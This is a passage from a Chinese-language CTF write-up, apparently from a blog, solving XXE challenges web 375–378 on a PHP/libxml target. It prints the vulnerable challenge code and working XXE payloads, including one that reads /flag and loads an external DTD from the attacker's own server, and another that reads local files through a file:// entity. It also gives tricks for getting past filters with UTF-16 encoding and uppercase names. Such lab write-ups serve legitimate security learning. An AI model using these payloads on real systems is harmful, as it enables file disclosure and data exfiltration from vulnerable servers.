class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br><br></code></pre></td></tr></table></figure><p>本关是在上一关的基础上又加了一个正则匹配<?xml version="1.0"?></p><p>我们只需要把上一关的xxe.xml改成xxe.dtd</p><p>还有payload也要相应的改变一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE test [<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;<br>&lt;!ENTITY % aaa SYSTEM &quot;http://填自己创建的网站的ip/xxe.dtd&quot;&gt;<br>%aaa;<br>]&gt;<br>&lt;root&gt;123&lt;/root&gt;<br></code></pre></td></tr></table></figure><p>其余操作不变</p><p> 如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20164653.png" alt="屏幕截图 2024-03-29 164653"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20164717.png" alt="屏幕截图 2024-03-29 164717"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20164728.png" alt="屏幕截图 2024-03-29 164728"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20165021.png" alt="屏幕截图 2024-03-29 165021"></p><p>解决！</p><p>也可以通过大写.XML来绕过</p><h3 id="web-376"><a href="#web-376" class="headerlink" title="web 376"></a>web 376</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 15:23:51</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);   <br></code></pre></td></tr></table></figure><p>这关只是在正则匹配上做了一些改变      变成了正则匹配的时候不区分大小写</p><p>直接拿上一关的方法做即可！</p><h3 id="web-377"><a href="#web-377" class="headerlink" title="web 377"></a>web 377</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>这一关在前两关的基础上又加了不区分大小写的过滤http</p><p>使用utf-16编码http即可其他的一模一样</p><p>在实战中因为burp不能使用半角字符所以只能使用编码</p><p>一个个试即可：</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs qml">整体简述<br>在开始之前，我想先简单说一下<br>在浏览器的地址栏中输入<span class="hljs-built_in">url</span>，发送http请求头(涉及tcp/ip/dns)<br><span class="hljs-attribute">http</span>:<span class="hljs-comment">//example.com/test.php</span><br>远程的web服务器(apache/iis等)接收到<span class="hljs-built_in">url</span>，分析请求头，根据它找到对应资源，返回一个响应头和数据<br><br>可以被浏览器解析的编码：<br>unicode编码：（utf<span class="hljs-number">-8</span>,utf<span class="hljs-number">-16</span>,utf<span class="hljs-number">-32</span>）<br><br><span class="hljs-built_in">url</span>编码<br>html编码<br></code></pre></td></tr></table></figure><h3 id="web-378"><a href="#web-378" class="headerlink" title="web 378"></a>web 378</h3><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240329213931516.png" alt="image-20240329213931516"></p><p>先输入点东西抓包看看 如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20213327.png" alt="屏幕截图 2024-03-29 213327"></p><p>发现输入的内容直接出现在了元素中 那我们在前面加上一个实体声明（内容要指向flag的路径）再在后面的元素中引用这个实体便可以将flag输出</p><p>直接构造payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>123无所谓什么都可以但是其他的不能变逻辑原理就是：一个内容要指向flag的路径的实体声明 再在后面的元素中引用这个实体 便可以将flag输出</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20213556.png" alt="屏幕截图 2024-03-29 213556"></p><p>OVER!</p><p>其实当我看到输入的内容出现在元素中的时候我其实第一想到的是xss但是试了一下发现压根不行又看了一下 页面源代码发现压根不存在注入所以burp所抓的发送包是经过后端源码</p>]]></content>
    
    
    
    <tags>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
